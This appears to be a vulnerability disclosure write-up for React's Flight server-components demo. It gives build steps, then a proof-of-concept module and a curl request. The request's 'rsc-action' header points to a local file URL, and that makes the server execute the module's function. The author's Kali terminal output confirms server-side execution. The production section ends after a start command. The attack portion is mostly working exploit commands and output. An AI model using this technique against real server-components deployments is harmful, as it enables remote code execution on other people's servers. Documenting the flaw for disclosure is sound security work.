

This document outlines the steps to run the Flight demo and trigger the vulnerable path.


## 1. Build + Run The Vulnerable Demo Locally

### Prerequisites

Install the following before proceeding:

1. **Node.js**: Use Node 20.x or 22.x (as specified in the fixture's `package.json`)
2. **Yarn classic**: Enable and prepare Yarn with the following commands:
   ```bash
   corepack enable
   corepack prepare yarn@1.22.22 --activate
   ```

### Step 1: Install Dependencies and Build Flight Prerequisites

From the repository root, install dependencies and build the Flight prerequisite artifacts:

```bash
cd /path/to/react
yarn install
yarn build-for-flight-dev
```

This produces `build/oss-experimental/` which the fixture copies into its `node_modules/`.

### Step 2: Install and Start the Flight Demo Servers

In another terminal, navigate to the Flight fixture directory, install dependencies, and start the servers:

```bash
cd /path/to/react/fixtures/flight
yarn install
yarn dev
```

Wait until you see logs indicating:
- **Global server** on `http://localhost:3000`
- **Regional server** on `http://localhost:3001`

## 2. Exploit the Vulnerability

# In Dev Environment:

### Step 3: Create a PoC Module

In a second terminal (separate from the server terminal), create the proof-of-concept module:

```bash
cat > /tmp/rsc_poc.mjs <<'EOF'
export function pwn() {
  const marker =
    `SERVER_EXEC pid=${process.pid} node=${process.version} window=${typeof window}`;
  console.log(marker); // this prints in the server terminal, not the browser
  return marker;
}
// Satisfy the server's check in fixtures/flight/server/region.js:215
pwn.$$typeof = Symbol.for("react.server.reference");
EOF
```

### Step 4: Trigger the Vulnerable Path

In the same terminal as Step 3, execute the following curl command:

```bash
curl -sS 'http://localhost:3000/' \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain' \
  -H 'rsc-action: file:///tmp/rsc_poc.mjs#pwn' \
  --data '[]' | strings | grep -F 'SERVER_EXEC'
```



My terminal Output:
```bash

┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
└─$ cat > /tmp/rsc_poc.mjs <<'EOF'
export function pwn() {
  const marker =
    `SERVER_EXEC pid=${process.pid} node=${process.version} window=${typeof window}`;
  console.log(marker); // this prints in the server terminal, not the browser
  return marker;
}
// Satisfy the server's check in fixtures/flight/server/region.js:215
pwn.$$typeof = Symbol.for("react.server.reference");
EOF

                                                                                
┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
└─$ curl -sS 'http://localhost:3000/' \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain' \
  -H 'rsc-action: file:///tmp/rsc_poc.mjs#pwn' \
  --data '[]' | strings | grep -F 'SERVER_EXEC'

0:{"root":[[["$","link","static/css/main.76138ffd.css",{"rel":"stylesheet","href":"static/css/main.76138ffd.css","precedence":"default"},null,"$1",0]],"$L2"],"returnValue":"SERVER_EXEC pid=11016 node=v22.22.0 window=undefined","formState":null}
```

# In Prod Environment:

Run the /react/fixtures/flight as production:

```bash
┌──(keshav㉿kali)-[~/Downloads/react/fixtures/flight]
└─$ NODE_ENV=production /home/keshav/.nvm/versions/node/v20.20.0/bin/yarn start
```





```
